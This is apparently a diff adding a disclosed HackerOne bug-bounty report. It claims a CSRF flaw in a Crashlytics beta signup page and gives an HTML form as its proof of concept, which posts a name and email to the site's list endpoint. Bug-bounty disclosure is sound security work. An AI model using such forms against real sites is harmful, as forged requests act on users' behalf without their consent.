@@ -1,0 +1,26 @@
+ReportLink:https://hackerone.com/reports/13856
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/defmax
+ReportedTo:Twitter(twitter)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:08.09.2014 14:55:13
+
+Summary:
+
+Hello Sir 
+
+This is N B Sri Harsha 
+
+I Have Found An  CSRF  in  http://try.crashlytics.com/
+
+
+POC ;- 
+
+<form method="POST" action="http://try.crashlytics.com/list/" class="validatable" id="beta_form">
+                                <input id="validate" class="clear validate validate-name validate-message" placeholder="your name" name="name" type="text">
+                                <input id="validate" class="clear validate validate-message" placeholder="name@server.com" name="email" type="text">
+                                <input name="sitereferral" value="" type="hidden">
+                                <input value="" id="emailVerify" type="submit">
+                            </form>
